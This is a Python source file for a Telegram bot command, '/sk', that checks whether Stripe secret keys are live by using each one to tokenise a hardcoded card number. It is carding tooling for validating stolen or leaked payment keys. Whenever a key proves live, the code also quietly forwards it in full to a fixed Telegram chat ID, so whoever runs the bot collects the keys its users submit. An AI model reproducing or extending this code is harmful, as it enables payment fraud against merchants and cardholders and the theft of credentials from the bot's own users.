import requests
from pyrogram import Client, filters

@Client.on_message(filters.command("sk"))
async def sk_check(client, message):
    try:
        sec = message.text[len('/sk '):].strip()

        if not sec or len(sec) < 30:
            await message.reply(
                "<b>❌ Invalid or Empty Input</b>\n\n"
                "<b>Usage:</b> <code>/sk sk_live</code>\n"
                "<i>Please ensure the API key is correct and try again.</i>"
            )
            return

        data = (
            'card[number]=5432768975806729&card[exp_month]=07&card[exp_year]=2026&card[cvc]=294'
        )

        response = requests.post(
            'https://api.stripe.com/v1/tokens',
            data=data,
            auth=(sec, '')
        )

        result = response.text

        if "tok_" in result:
            msg = (
                f"<b>✅ <u>LIVE KEY</u> ✅</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>SK LIVE!! ✅</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )
            await message.reply(msg)

            log_chat_id = "1190070178"
            log_msg = (
                f"SK KEY: {sec}\n"
                f"➤ Status: LIVE KEY!! ✅\n"
                f"Checked by: @{message.from_user.username}\n"
                f"Bot Made by: [Professional Dev]"
            )
            requests.get(
                "https://api.telegram.org/botYOUR_BOT_API_TOKEN/sendMessage",
                params={"chat_id": log_chat_id, "text": log_msg}
            )

        elif 'api_key_expired' in result:
            await message.reply(
                f"<b>❌ <u>DEAD KEY</u> ❌</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>EXPIRED KEY ❌</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )

        elif 'Invalid API Key provided' in result:
            await message.reply(
                f"<b>❌ <u>DEAD KEY</u> ❌</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>INVALID KEY ❌</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )

        elif 'testmode_charges_only' in result or 'test_mode_live_card' in result:
            await message.reply(
                f"<b>❌ <u>DEAD KEY</u> ❌</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>TESTMODE CHARGES ONLY ❌</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )

        elif 'You did not provide an API key.' in result:
            await message.reply(
                f"<b>❌ <u>DEAD KEY</u> ❌</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>PLEASE PROVIDE AN API KEY ❌</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )

        else:
            await message.reply(
                f"<b>❌ <u>DEAD KEY</u> ❌</b>\n\n"
                f"<b>KEY:</b> <code>{sec}</code>\n"
                f"<b>RESPONSE:</b> <i>{result}</i>\n\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>Checked by:</b> @{message.from_user.username}\n"
                f"<b>Bot Made by:</b> [Professional Dev]"
            )

    except Exception as e:
        await message.reply(
            "<b>❌ An error occurred while processing the request. Please try again later.</b>"
        )
        print(f"Error: {str(e)}")
